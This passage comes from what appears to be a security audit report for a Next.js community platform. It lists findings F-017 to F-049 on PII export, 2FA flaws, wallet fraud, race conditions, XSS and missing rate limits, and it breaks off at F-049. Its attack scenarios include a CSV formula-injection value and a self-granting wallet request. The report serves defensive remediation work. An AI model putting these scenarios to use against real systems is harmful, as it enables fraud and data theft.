The CSV export endpoint streams every Speedrun registration (name, email, phone, school, team, captain status, referral source) without per-row scoping, no rate-limiting, no audit logging, and no formula-injection prefix (=, +, -, @, TAB) — see also F-078. A single CORE pull can export thousands of PII rows; a malicious CSV with `=HYPERLINK("...")` triggers code execution when opened in Excel/Sheets.

**Attack scenario:** See F-016 chain + F-078 CSV formula.

**Business impact:** Mass PII breach (DPDP / GDPR notifiable); CSV-injection RCE on admin laptops opening the export.

**Remediation:**
1. Audit-log every export call: `(actor, queryParams, rowCount)`.
2. Rate-limit to 1 export per CORE per hour.
3. Apply formula-injection prefix: prepend `'` to any cell starting with `= + - @ TAB`.
4. Add Content-Type `text/csv; charset=utf-8` and `Content-Disposition: attachment` (avoid inline render).
5. Mask email/phone unless caller has `speedrun:export-pii` explicit grant.
6. Watermark export with admin email + timestamp embedded in a final row.

**Detection:** Alert on any export call > 100 rows or > 1× per CORE per hour.

---

### F-018: TOTP secret returned in 2FA setup response (secret materially exposed mid-flow)

**Severity:** High
**CVSS 3.1:** AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N (7.4)
**CWE:** CWE-522 (Insufficiently Protected Credentials)
**OWASP:** A02:2021 — Cryptographic Failures
**Affected roles:** any user enrolling 2FA
**Affected panels:** /me/2fa setup
**Categories:** Cat 6
**Location:** (2FA setup route — `app/api/me/2fa/totp/setup/route.ts` or equivalent)

**Description:**
The 2FA TOTP setup response returns the generated `secret` plaintext (in addition to the QR code). Any intermediary (browser extension, network MITM if not on HTTPS, browser cache, error-tracking service) that captures the response captures the secret in perpetuity. The secret should only be embedded in the QR-code image stream and never in JSON.

**Attack scenario:**
1. User initiates 2FA enrollment; response payload includes `{ secret: "JBSWY3DPEHPK3PXP", qrUrl: "..." }`.
2. Browser extension (compromised or malicious) reads the response.
3. Extension exfiltrates the secret; attacker now has the user's TOTP forever.

**Business impact:** Defeats the entire purpose of TOTP 2FA — attacker can generate valid codes alongside the user.

**Remediation:**
1. Return only the QR-code data URL or a server-rendered SVG; never include the raw secret.
2. If "manual entry" UX is needed, expose the secret via a separate, very-short-lived (60s) one-time read endpoint that the user explicitly requests.
3. Log the secret-disclosure read into AuditLog.

**Detection:** Strip the `secret` field from any 2FA response in CSP report-only / Sentry breadcrumbs review.

---

### F-019: Member.permissions JSON visible to all CORE users (privilege map enumeration)

**Severity:** High
**CVSS 3.1:** AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:N/A:N (3.6) — but high in chains
**CWE:** CWE-200
**OWASP:** A01:2021
**Affected roles:** CORE
**Affected panels:** /core/members
**Categories:** Cat 6
**Location:** [app/api/members/route.ts](../../app/api/members/route.ts)

**Description:** Every CORE caller receives the full `permissions` JSON for every member in the list response. This reveals the privilege topology — who has FULL_ACCESS, who can grant which scopes — turning the panel into a target-prioritization map for compromised CORE sessions.

**Attack scenario:** See F-016. Privilege map drastically reduces attacker effort to identify the highest-leverage account to target.

**Business impact:** Accelerates lateral / vertical escalation pathways.

**Remediation:** Hide `permissions` from list responses; show only on a dedicated permissions-detail view gated by `members:FULL_ACCESS`.

**Detection:** Audit reads of `/api/members?include=permissions`.

---

### F-020: Application.data form-response PII visible to any FULL_ACCESS admin without per-program scoping

**Severity:** High
**CVSS 3.1:** AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N (4.9)
**CWE:** CWE-285 (Improper Authorization)
**OWASP:** A01:2021
**Affected roles:** FULL_ACCESS admins; broader if `programs:READ`
**Affected panels:** /core/programs/[id]/applications
**Categories:** Cat 6
**Location:** [app/api/applications/](../../app/api/applications/), [app/api/programs/[id]/applications/](../../app/api/programs/[id]/applications/)

**Description:** Application responses (free-text answers including phone numbers, addresses, identification, financial info collected during program intake) are returned to any FULL_ACCESS admin regardless of whether they are a designated reviewer for that program. There is no per-program ACL ("only admins assigned to Program X can see Program X applications").

**Remediation:** Add `ProgramReviewerAssignment` model; gate `/api/programs/[id]/applications` on assignment membership. Mask sensitive fields by default; require explicit "view PII" action that is audit-logged.

**Detection:** Audit reads with row counts; alert if a single admin reads applications across > 3 programs.

---

### F-021: Soft-deleted users still pass signIn callback (offboarded admin can re-login)

**Severity:** High
**CVSS 3.1:** AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N (7.6) — requires Google account intact
**CWE:** CWE-285, CWE-613
**OWASP:** A07:2021
**Affected roles:** offboarded admin / member
**Affected panels:** all panels that role had
**Categories:** Cat 1, Cat 3, Cat 11, Cat 23
**Location:** [lib/auth-options.ts:13-86](../../lib/auth-options.ts#L13-L86)

**Description:**
The `signIn` callback queries `Member.findFirst({ where: { email: { equals, mode: 'insensitive' } } })` and `CommunityMember.findFirst(...)` with no `deletedAt: null` filter. Soft-deleted users are still found, and the `jwt` callback then assigns them their original role. Offboarding via soft-delete is therefore *cosmetic only* — the user can immediately re-login and regain full access.

**Attack scenario:**
1. Alice (CORE admin) is offboarded; `Member.deletedAt = NOW()`.
2. Her IT-managed Google account is not yet deactivated (the typical race).
3. Alice signs back in via Google OAuth. `signIn` callback finds her (soft-deleted) Member row; `jwt` issues `role: CORE`.
4. Alice has full admin access for 30 days (until JWT expiry — which she can refresh by re-loading).

**Business impact:** Offboarding is broken; insider risk after termination is unmitigated.

**Remediation:**
1. Add `deletedAt: null` filter to all `findFirst` calls in `signIn` and `jwt`.
2. Explicit reject in `signIn` when `member.deletedAt !== null`: return `false` (NextAuth will redirect to `/auth/error`).
3. Replace soft-delete model with explicit `status: 'active' | 'archived' | 'deleted'`; check `status === 'active'` everywhere.
4. Add an offboarding runbook step: revoke Google Workspace access *before* DB soft-delete to remove the race.

**Detection:** Alert if a `Member` row with `deletedAt IS NOT NULL` appears in any signin event log.

---

### F-022: No input validation on `earnReward` / `spendPoints` / `adminAdjust` amounts (overflow + admin self-grant)

**Severity:** High
**CVSS 3.1:** AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:H (5.5)
**CWE:** CWE-20 (Improper Input Validation), CWE-190 (Integer Overflow), CWE-840 (Business Logic Errors)
**OWASP:** A04:2021
**Affected roles:** any caller of these functions; admins via `adminAdjust`
**Affected panels:** /wallet/adjust, all earn/spend paths
**Categories:** Cat 12, Cat 22, Cat 30
**Location:** [lib/wallet.ts:28-262](../../lib/wallet.ts#L28-L262)

**Description:**
The wallet primitives accept `xp`, `points`, `amount` parameters with zero validation. There are no `> 0` guards (negative `points` flows can credit instead of debit — see F-102), no upper bounds (admin can grant `999_999_999` points in one call — overflows the 32-bit `Int` per F-103), no admin daily cap, no dual-control. Combined with F-092 (no AuditLog), an admin can self-enrich silently.

**Attack scenario:**
1. Compromised admin (or insider) calls `POST /api/wallet/adjust` with `{ userEmail: "self@team1.io", points: 999999999, description: "Referral bonus payout" }`.
2. `adminAdjust` writes `pointsBalance: { increment: 999999999 }`.
3. No AuditLog entry; only a `WalletTransaction` of `type='admin_adjust'` (which is a normal data row, not an audit row).
4. Admin redeems all swag in inventory; cashes out via shipping address.
5. F-092 ensures forensics cannot reconstruct attribution.

**Business impact:** Direct financial fraud (Bounty.cash is INR-denominated real money); inventory drain; reputational damage.

**Remediation:**
1. Validate in every entry point: `if (xp < 0 || xp > 1_000_000) throw`; `if (points < 0 || points > 1_000_000) throw`; for `spendPoints`, `if (amount <= 0) throw`.
2. For `adminAdjust`: cap at 10,000 points per single call; cap per-admin per-day at 50,000.
3. Require `approverEmail` (second admin's email) for any `adminAdjust` over 1,000 or any negative.
4. Migrate balance fields to `BigInt` (see F-103).
5. AuditLog every wallet primitive (see F-092).

**Detection:** Alert on any `WalletTransaction` with `pointsAmount > 5000` from `type='admin_adjust'`.

---

### F-023: Non-atomic stock decrement + spendPoints in swag redemption (oversell, double-charge)

**Severity:** High
**CVSS 3.1:** AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N (5.3)
**CWE:** CWE-362
**OWASP:** A04:2021
**Affected roles:** any authenticated user
**Affected panels:** /swag
**Categories:** Cat 12
**Location:** [app/api/swag/[id]/redeem/route.ts:38-78](../../app/api/swag/[id]/redeem/route.ts#L38-L78)

**Description:**
The redeem flow does (1) `$executeRaw UPDATE SwagItem SET remainingStock = remainingStock - X WHERE remainingStock >= X` (2) `await spendPoints(...)` in a separate Serializable TX (3) on failure, manually `$executeRaw UPDATE SwagItem SET remainingStock = remainingStock + X` rollback. Steps 1 and 2 are not in a single transaction; the rollback of step 1 in case of step 2 failure is not atomic. Race windows allow oversells and (rarer) double-charges.

**Attack scenario / failure mode:**
- Two users redeem the last unit at the same time. Both pass step 1. One fails at step 2 (insufficient balance), triggering rollback — restoring stock — but the other user's success has already created the order. If the rollback happens *before* the second user's step 1 completes, both users could end up with stock-deduct success and one ends with no order while the other gets duplicated.

**Business impact:** Inventory mismanagement; user confusion; possible duplicate-shipping cost.

**Remediation:**
1. Wrap the entire redeem flow (stock check + decrement + spendPoints + order create) in a single `prisma.$transaction(async (tx) => ..., { isolationLevel: 'Serializable' })`.
2. Inside the tx, use `tx.swagItem.update({ where: { id, remainingStock: { gte: qty } }, data: { remainingStock: { decrement: qty } } })` — Prisma will throw P2025 if the row no longer matches, which is the natural locking primitive.
3. `spendPoints` should accept an optional `tx` parameter to participate in the outer transaction.

**Detection:** Reconcile `SUM(SwagOrder.quantity) by swagItemId` against `SwagItem.totalStock - SwagItem.remainingStock`; alert on mismatch.

---

### F-024: Concurrent bounty submission race — DB unique constraint missing per dev's own TODO

**Severity:** High
**CVSS 3.1:** AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N (5.3)
**CWE:** CWE-362
**OWASP:** A04:2021
**Affected roles:** any authenticated user
**Affected panels:** /bounty
**Categories:** Cat 12, Cat 22
**Location:** [app/api/bounty/submissions/route.ts:112-152](../../app/api/bounty/submissions/route.ts#L112-L152), [prisma/schema.prisma](../../prisma/schema.prisma)

**Description:**
`BountySubmission` lacks `@@unique([bountyId, submittedById])` (the developer's own code comment notes this should be added but it isn't). The route does a `findFirst` pre-check — non-atomic with the subsequent `create` — so concurrent POSTs can both succeed. On approval each submission triggers `earnReward`, doubling the payout.

**Remediation:**
1. Add `@@unique([bountyId, submittedById])` and `@@unique([bountyId, publicUserId])` to the schema; migrate.
2. Replace `findFirst` + `create` with a single `create` and catch P2002 → return 409.
3. Wrap approval + `earnReward` in a Serializable transaction.

**Detection:** Reconcile `BountySubmission.count by (bountyId, submittedById) > 1`; alert + clean up.

---

### F-025: Zero rate-limiting on points-earning endpoints (quests, bounty, swag, speedrun)

**Severity:** High
**CVSS 3.1:** AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H (6.5)
**CWE:** CWE-770 (Allocation of Resources Without Limits or Throttling), CWE-799
**OWASP:** A04:2021
**Affected roles:** any authenticated user
**Affected panels:** /quests, /bounty, /swag, /speedrun
**Categories:** Cat 21, Cat 22
**Location:** [app/api/quests/](../../app/api/quests/), [app/api/bounty/](../../app/api/bounty/), [app/api/swag/](../../app/api/swag/), [app/api/speedrun/](../../app/api/speedrun/)

**Description:**
The recon noted a per-user rate-limit utility exists but it is applied inconsistently. None of the points-earning routes enforce it. Combined with F-009 (race) and F-005 (replay), an attacker can farm points at line-rate.

**Remediation:** Apply `rateLimit({ key: session.user.email, max: 5, windowSec: 60 })` to every mutating route under quests/bounty/swag/speedrun. Add a global per-IP rate limit (60 req/min) at middleware.

**Detection:** Alert on per-user POST rate > 10/min on any mutating endpoint.

---

### F-026: Zero rate-limiting on admin cost-amplification endpoints

**Severity:** High
**CVSS 3.1:** AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:L/A:H (4.7)
**CWE:** CWE-770
**OWASP:** A04:2021
**Affected roles:** any CORE
**Affected panels:** /core/event-feedback, /core/applications, /core/members (broadcast)
**Categories:** Cat 21, Cat 22
**Location:** [app/api/event-feedback/send-email/route.ts](../../app/api/event-feedback/send-email/route.ts), broadcast routes

**Description:** Admin email-broadcast endpoints loop through the recipient list and call SMTP per recipient; no per-call rate limit and no per-day cap. A single (compromised or careless) admin can blow through the SMTP quota or fan-out spam to every member instantly.

**Remediation:** Cap broadcasts at 1 per admin per 5 minutes; queue large batches. Cap recipient count per single call. Audit-log every broadcast (see F-029).

---

### F-027: No rate-limiting on authentication paths / NextAuth callbacks (credential-stuffing surface)

**Severity:** High
**CVSS 3.1:** AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (5.3)
**CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)
**OWASP:** A07:2021
**Affected roles:** anyone
**Affected panels:** /api/auth/*
**Categories:** Cat 11, Cat 21, Cat 22
**Location:** [app/api/auth/](../../app/api/auth/), [middleware.ts](../../middleware.ts)

**Description:** NextAuth's callback routes (`/api/auth/callback/google`, `/api/auth/signin`, etc.) have no rate limit. While Google OAuth itself rate-limits, the callback route still does DB lookups and creates rows; a denial-of-service attacker can spam the callback to exhaust DB connections. There is also no per-IP enumeration limit on `signIn` (compounded by F-110 timing oracle).

**Remediation:** Add 10 req/min per IP at middleware on `/api/auth/*`. Add 30 req/hour per email on `/api/auth/callback/*`.

---

### F-028: No anomaly detection / no Sentry-init / no alerting on auth or wallet anomalies

**Severity:** High
**CVSS 3.1:** N/A (detection gap, not exploitation)
**CWE:** CWE-778, CWE-693 (Protection Mechanism Failure)
**OWASP:** A09:2021
**Affected roles:** all
**Affected panels:** all (monitoring gap)
**Categories:** Cat 25
**Location:** [package.json](../../package.json), [lib/](../../lib/)

**Description:** Although `NEXT_PUBLIC_SENTRY_DSN` is set (F-034), no `Sentry.init()` is found in the source — Sentry is dormant. No anomaly detection on wallet flows, no alerts on auth-failures, no impossible-travel detection (F-067), no balance-spike alerts (F-068). The team will not know when an attack is in progress.

**Remediation:**
1. Implement `Sentry.init()` in `app/layout.tsx` (client) and `instrumentation.ts` (server).
2. Add wallet-anomaly job: query `WalletTransaction` daily for top-N earners; alert on > 3σ.
3. Pipe auth-failure events to Slack (post-F-001 remediation, secret webhook).
4. Add impossible-travel detection on signin: store `lastSigninGeo`; alert if next signin > 1000 km within 1h.

---

### F-029: No audit log on admin login / admin PII reads / admin email broadcasts

**Severity:** High
**CVSS 3.1:** N/A (detection gap)
**CWE:** CWE-778
**OWASP:** A09:2021
**Affected roles:** all admins
**Affected panels:** all admin surfaces
**Categories:** Cat 7, Cat 11, Cat 13, Cat 25, Cat 27
**Location:** [lib/auth-options.ts](../../lib/auth-options.ts), [app/api/members/route.ts](../../app/api/members/route.ts), [app/api/event-feedback/send-email/route.ts](../../app/api/event-feedback/send-email/route.ts), [app/api/admin/public-users/route.ts](../../app/api/admin/public-users/route.ts)

**Description:** `signIn` callback does not write to AuditLog (so we don't know *who logged in when*). `GET /api/members`, `GET /api/admin/public-users`, `GET /api/speedrun/registrations`, and the CSV-export endpoint do not audit-log admin reads of PII. Email-broadcast endpoint does not log broadcasts. Combined with F-013 (audit-log mutability), the full insider-detection layer is absent.

**Remediation:**
1. Add `logAudit({ action: 'ADMIN_LOGIN', actorId, metadata: { ip, ua } })` in `signIn` callback for CORE/MEMBER signins.
2. Add `logAudit({ action: 'PII_READ', resource, count })` in admin PII-list endpoints (sample at 1% if volume is too high; always log if `count > 50`).
3. Audit every email broadcast.

---

### F-030: broadcastToRunRegistrants() iterates synchronously across registrants — fan-out timeout / partial-delivery

**Severity:** High
**CVSS 3.1:** AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:L/A:H (4.7)
**CWE:** CWE-400 (Uncontrolled Resource Consumption), CWE-1284
**OWASP:** A04:2021
**Affected roles:** Speedrun captains using broadcast
**Affected panels:** /speedrun (broadcast feature)
**Categories:** Cat 9
**Location:** [lib/speedrunNotify.ts:157-184](../../lib/speedrunNotify.ts#L157-L184)

**Description:** The `broadcastToRunRegistrants` function iterates over the registrant list and awaits a notification (push + email) per registrant in a single function invocation. With 500+ registrants, the Vercel function timeout (60s default) will hit before completion; some recipients receive notifications, others do not, and there is no retry queue or visibility into the partial state.

**Remediation:**
1. Split into an enqueue + worker pattern: enqueue one job per recipient (or per chunk of 50) into a queue (Vercel Queues, Inngest, or Redis-based).
2. Workers handle each chunk independently, idempotently.
3. UI shows per-broadcast progress and retry failed chunks.

**Detection:** Alert if any `broadcast` invocation runs > 30s.

---

### F-031: No serverless function memory/timeout caps configured in vercel.json (cost & DoS amplification)

**Severity:** High
**CVSS 3.1:** AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (5.3)
**CWE:** CWE-400
**OWASP:** A04:2021
**Affected roles:** anyone able to trigger an expensive route
**Affected panels:** all
**Categories:** Cat 9
**Location:** [vercel.json](../../vercel.json) — no `functions` config object

**Description:** `vercel.json` has no `functions` map specifying per-route `maxDuration` / `memory` overrides. All routes inherit Vercel's account default (60s, 1024 MB on Pro). Expensive endpoints (CSV export, broadcast, sync-events) can run to the full quota; F-122 (data-grid fetches all rows) makes this exploitable as a DoS.

**Remediation:** Set per-route caps in `vercel.json`: cron handlers `maxDuration: 300, memory: 1024`; user-facing routes `maxDuration: 10, memory: 512`; export routes `maxDuration: 30, memory: 1024`.

---

### F-032: Trusted Types not enforced — DOM-XSS unmitigated

**Severity:** High
**CVSS 3.1:** AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N (8.3)
**CWE:** CWE-79
**OWASP:** A03:2021 — Injection
**Affected roles:** all
**Affected panels:** all
**Categories:** Cat 16, Cat 17
**Location:** [next.config.ts:29-43](../../next.config.ts#L29-L43)

**Description:** CSP is missing `require-trusted-types-for 'script'` and `trusted-types default 'allow-duplicates'`. With F-008 (`unsafe-inline`) already permitting injection and F-033 (innerHTML in playbook editor) providing a sink, DOM-based XSS has no browser-level mitigation.

**Remediation:** Add Trusted Types directives to CSP after auditing innerHTML usage. Wrap legitimate innerHTML sites with a Trusted Types policy that calls DOMPurify.

---

### F-033: innerHTML / dangerouslySetInnerHTML used without sanitization in playbook image fallback + markdown render

**Severity:** High
**CVSS 3.1:** AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N (8.0)
**CWE:** CWE-79
**OWASP:** A03:2021
**Affected roles:** any user; admin if attacker is member
**Affected panels:** /core/playbooks, /public/playbooks
**Categories:** Cat 16, Cat 17, Cat 30
**Location:** [components/playbooks/Editor.tsx](../../components/playbooks/Editor.tsx), [components/core/MarkdownEditor.tsx](../../components/core/MarkdownEditor.tsx)

**Description:** Playbook editor and the new MarkdownEditor render user content via paths that include `dangerouslySetInnerHTML` and an `<img onerror=...>` fallback pattern. No DOMPurify / no rehype-sanitize chain. With F-008 CSP open, stored XSS in a playbook executes in any viewer's session.

**Remediation:**
1. Pipe all rendered markdown through `rehype-sanitize` with a strict allow-list.
2. Replace `<img onerror>` fallback with a React state approach (already done in some files per Cat 17 review — finalize across all).
3. Run `eslint-plugin-react/no-danger` rule to block regressions.

---

### F-034: NEXT_PUBLIC_SENTRY_DSN exposed without an active Sentry.init() (DSN leak + monitoring gap)

**Severity:** High
**CVSS 3.1:** AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (3.1) — but high-severity context as monitoring is dormant
**CWE:** CWE-200
**OWASP:** A09:2021
**Affected roles:** anyone scanning the bundle
**Affected panels:** all
**Categories:** Cat 16, Cat 25
**Location:** client bundle, [package.json](../../package.json)

**Description:** The DSN is exposed (which is fine — DSNs are designed as public IDs), but **no Sentry.init() call exists** in source. So: monitoring is dead, AND attackers see the DSN signaling the team intended monitoring (and can spam quota by sending fake events to that DSN). High severity on the monitoring-gap aspect.

**Remediation:** Either remove the DSN env var (if Sentry is not in use), or properly initialize Sentry on client + server.

---

### F-035: Cron endpoint 404 at trigger path (cron schedule references missing route)

**Severity:** High
**CVSS 3.1:** N/A (operational; potential security-impact via missed expirations)
**CWE:** CWE-754
**OWASP:** A04:2021
**Affected roles:** all (downstream of cron-driven cleanup)
**Affected panels:** all
**Categories:** Cat 10
**Location:** [vercel.json](../../vercel.json)

**Description:** The Cat 10 scan flagged a cron trigger pointing to a path that 404s. Either the route was deleted/renamed without updating `vercel.json` or vice versa. Result: the cleanup/expire job never runs, leading to silent data retention bloat or stale state. Verify and reconcile `vercel.json` cron paths against `app/api/cron/*` route files.

**Remediation:** Add a CI check: enumerate `vercel.json` cron paths, HEAD each one against the freshly-deployed URL and assert 200/401 (not 404).

---

### F-036: Permissive `host` rewrite / WAF bypass vector via leading-dot host header

**Severity:** High
**CVSS 3.1:** AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:H/A:N (6.4)
**CWE:** CWE-444 (HTTP Request Smuggling-class)
**OWASP:** A05:2021
**Affected roles:** anyone
**Affected panels:** all
**Categories:** Cat 10
**Location:** [next.config.ts](../../next.config.ts)

**Description:** Cat 10 flagged a permissive Host header handling pattern that may allow WAF bypass via leading-dot or unusual host strings. While Vercel's edge layer normalizes most headers, the application-side host check can be tricked. Verify via the Cat 10 scan's detailed PoC.

**Remediation:** Pin host validation to an explicit allowlist (`team1india.vercel.app`, custom domain). Reject requests with unexpected Host headers at middleware before any application logic.

---

### F-037: 2FA enforcement only at middleware, not at NextAuth login callback (single-factor JWT issued)

**Severity:** High
**CVSS 3.1:** AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N (6.5)
**CWE:** CWE-287, CWE-308 (Use of Single-factor Authentication)
**OWASP:** A07:2021
**Affected roles:** any 2FA-enabled user
**Affected panels:** all
**Categories:** Cat 3, Cat 11, Cat 30
**Location:** [lib/auth-options.ts:156](../../lib/auth-options.ts#L156), [middleware.ts](../../middleware.ts)

**Description:** The NextAuth `jwt` callback issues a fully-privileged JWT *before* the 2FA challenge is presented. Middleware then redirects 2FA-required routes to a TOTP page. This means: (a) the JWT is single-factor and could be exfiltrated post-OAuth-callback before TOTP completes; (b) any route not covered by middleware (e.g., a new route added without updating middleware matcher) is reachable with a single-factor session.

**Remediation:** Mark JWT as `tfaPending: true` on issuance; gate `session` callback (or every privileged route) on `tfaSatisfied: true`. Only set `tfaSatisfied` after TOTP/passkey verification.

---

### F-038: Service Worker caches authenticated `/core.*` HTML for 5 min on shared device

**Severity:** High
**CVSS 3.1:** AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N (5.5)
**CWE:** CWE-525 (Use of Web Browser Cache Containing Sensitive Information)
**OWASP:** A05:2021
**Affected roles:** any user on a shared device
**Affected panels:** /core/*
**Categories:** Cat 5, Cat 15
**Location:** [public/sw.js](../../public/sw.js)

**Description:** The Service Worker caches GET responses for paths matching the `/core.*` pattern with a 5-minute TTL. On a shared device, after admin Alice logs out, the next user (visiting `/core/members`) is served Alice's cached HTML containing PII. Logout does not invalidate the SW cache.

**Remediation:**
1. Exclude `/core/*` and `/api/*` from SW caching entirely (only cache `/_next/static/*` and `/icons/*`).
2. On logout, send `clients.claim()` + `caches.delete(...)` to wipe the cache.
3. Add `Cache-Control: private, no-store` headers to all `/core/*` HTML responses; the SW respects these.

---

### F-039: Service Worker BYOSW registration not isolated to scope

**Severity:** High
**CVSS 3.1:** AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N (6.8)
**CWE:** CWE-942
**OWASP:** A05:2021
**Affected roles:** all PWA users
**Affected panels:** all
**Categories:** Cat 15
**Location:** [public/sw.js](../../public/sw.js), [app/layout.tsx](../../app/layout.tsx)

**Description:** SW is registered at the root scope. Combined with F-008 CSP allowing `unsafe-inline`, a stored-XSS could re-register a malicious SW that intercepts all subsequent requests (the SW would persist across page navigations and survive logout).

**Remediation:** Register SW with `{ scope: '/pwa/' }` and only enable PWA features under that scope. Or strictly validate `serviceWorker` updates and add a kill-switch (server-side flag the SW polls).

---

### F-040: Web Push payload encryption flow uses VAPID privKey at runtime

**Severity:** High
**CVSS 3.1:** AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H (7.2) — if key compromised
**CWE:** CWE-321 (Use of Hard-coded Cryptographic Key — analogous: env-var key with no rotation)
**OWASP:** A02:2021
**Affected roles:** all push-subscribed users
**Affected panels:** push notifications
**Categories:** Cat 15, Cat 24
**Location:** [lib/webpush.ts](../../lib/webpush.ts) (or equivalent)

**Description:** VAPID private key is loaded into every serverless function on cold start. If the key is leaked (Vercel logs, errored stack trace), an attacker can impersonate the platform to all push-subscribed users (browser displays the message as if from the platform).

**Remediation:**
1. Move push-send to a single dedicated function (e.g., `/api/internal/push`) accessible only via internal call from queued jobs.
2. Rotate VAPID key annually; document rotation playbook.
3. Add audit log for every push send (recipient count, topic, sender admin).

---

### F-041: No SCA / SAST / Dependabot / SBOM in CI; supply-chain compromises undetected

**Severity:** High
**CVSS 3.1:** N/A (preventive control absent)
**CWE:** CWE-1357 (Reliance on Insufficiently Trustworthy Component)
**OWASP:** A06:2021 — Vulnerable & Outdated Components
**Affected roles:** all
**Affected panels:** all
**Categories:** Cat 26, Cat 30
**Location:** (no `.github/workflows/`), [package.json](../../package.json)

**Description:** No `.github/workflows/` directory; no Dependabot config; no SBOM generation; no `npm audit` / `pnpm audit` / `bun audit` step in CI. The project depends on 100+ npm packages including pre-1.0 BlockNote and EOL-trajectory next-auth v4. A compromised dependency goes undetected.

**Remediation:**
1. Add `.github/dependabot.yml` (weekly checks for npm + GitHub Actions ecosystems).
2. Add `.github/workflows/security.yml` running: `bun audit`, `osv-scanner`, `gitleaks`, `semgrep --config p/owasp-top-ten`.
3. Generate SBOM via `cyclonedx-bun` on every release; archive.
4. Set up GitHub Code Scanning (CodeQL) for JS/TS.

---

### F-042: Member.signupIp + signin email logged plaintext on every login (PII in app logs)

**Severity:** High
**CVSS 3.1:** AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N (4.4)
**CWE:** CWE-532 (Insertion of Sensitive Info into Log File)
**OWASP:** A09:2021
**Affected roles:** all signins
**Affected panels:** authentication
**Categories:** Cat 11, Cat 13, Cat 25, Cat 27
**Location:** [lib/auth-options.ts:13-86](../../lib/auth-options.ts#L13-L86)

**Description:** `signIn` callback emits `console.log("signin: " + email)` style entries; email is plaintext and persisted in Vercel function logs (typically retained 30+ days). IP address is also captured into the DB and logged. PII in logs violates DPDP §8 / GDPR Art. 5(1)(c) data minimization.

**Remediation:** Replace email logs with hashed user ID; if email is needed for support correlation, hash with HMAC keyed by a separate secret. Don't log IP except in dedicated audit pipeline (with retention policy).

---

### F-043: Speedrun registrations bulk-export endpoint not rate-limited and not audited

**Severity:** High
**CVSS 3.1:** AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N (4.9)
**CWE:** CWE-770, CWE-778
**OWASP:** A09:2021
**Affected roles:** any CORE
**Affected panels:** /core/speedrun
**Categories:** Cat 7, Cat 13, Cat 19, Cat 21, Cat 27
**Location:** [app/api/speedrun/registrations/export/route.ts](../../app/api/speedrun/registrations/export/route.ts)

**Description:** Re-stated dimension of F-017 from the rate-limit / audit-trail perspective. See F-017 remediation.

---

### F-044: Step-up auth missing on critical actions

**Severity:** High
**CVSS 3.1:** AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N (6.6)
**CWE:** CWE-308
**OWASP:** A07:2021
**Affected roles:** any CORE / any user with 2FA
**Affected panels:** /core/members, /me/2fa, /core/wallet
**Categories:** Cat 5, Cat 7, Cat 13
**Location:** [app/api/members/[id]/permissions/route.ts](../../app/api/members/[id]/permissions/route.ts), [app/api/me/2fa/](../../app/api/me/2fa/), [app/api/wallet/adjust/route.ts](../../app/api/wallet/adjust/route.ts)

**Description:** Permission-grant, 2FA disable, and wallet-adjust endpoints accept the existing session with no re-auth challenge. A momentary session hijack (open laptop, F-038 SW cache) is enough to perform the highest-impact actions.

**Remediation:** Require a fresh TOTP/passkey challenge (stored short-lived `step_up` JWT claim valid 5 min) before processing any of these endpoints. Pair with F-012 4-eyes flow.

---

### F-045: Public Vercel preview deployment may share prod DATABASE_URL / NEXTAUTH_SECRET

**Severity:** High (Critical if confirmed — see F-014)
**CVSS 3.1:** See F-014
**CWE:** See F-014
**OWASP:** A05:2021
**Affected roles:** PR-deploy capable contributors
**Affected panels:** all
**Categories:** Cat 23, Cat 26
**Location:** Vercel project env scoping (out of repo)

**Description:** Re-stated from Cat 23 (data-store) angle: same root cause as F-014 but separately tracked because the data-store dimension calls for separate `DATABASE_URL` more loudly than the auth dimension. Verify in Vercel UI.

**Remediation:** See F-014.

---

### F-046: No Separation of Duties between super-admin role-grant and approval

**Severity:** Medium
**CWE:** CWE-1220 | **OWASP:** A01:2021 | **Cat refs:** Cat 3, Cat 27
**Location:** [app/api/members/[id]/permissions/route.ts](../../app/api/members/[id]/permissions/route.ts)

A single FULL_ACCESS admin can both initiate and finalize permission grants. No second-approver workflow. **Remediation:** Implement the 4-eyes pattern from F-012; gate all FULL_ACCESS grants on dual-control.

---

### F-047: Audit log retention policy not codified in repo; < incident-detection window

**Severity:** Medium
**CWE:** CWE-778 | **OWASP:** A09:2021 | **Cat refs:** Cat 25, Cat 27
**Location:** [prisma/schema.prisma](../../prisma/schema.prisma)

No retention policy is documented or enforced for `AuditLog`/`Log` tables. Industry-typical incident detection windows are 200+ days; the table grows unbounded with no archival/purge job. **Remediation:** Define a retention policy (e.g., 365 days hot, 7 years cold storage); add a cron job for archival to S3; document in `docs/security/`.

---

### F-048: Audit log readable to all CORE (insider visibility into coworker actions)

**Severity:** Medium
**CWE:** CWE-359 | **OWASP:** A01:2021 | **Cat refs:** Cat 25
**Location:** [app/api/audit/](../../app/api/audit/)

Any CORE user can read the full AuditLog including other admins' actions. Provides reconnaissance value to insiders/compromised accounts. **Remediation:** Restrict full audit-read to a dedicated `audit:READ` permission; show users only their own actions by default.

---

### F-049: Notification-deletion route lacks ownership check (IDOR)

**Severity:** Medium
**CWE:** CWE-639 | **OWASP:** A01:2021 | **Cat refs:** Cat 4
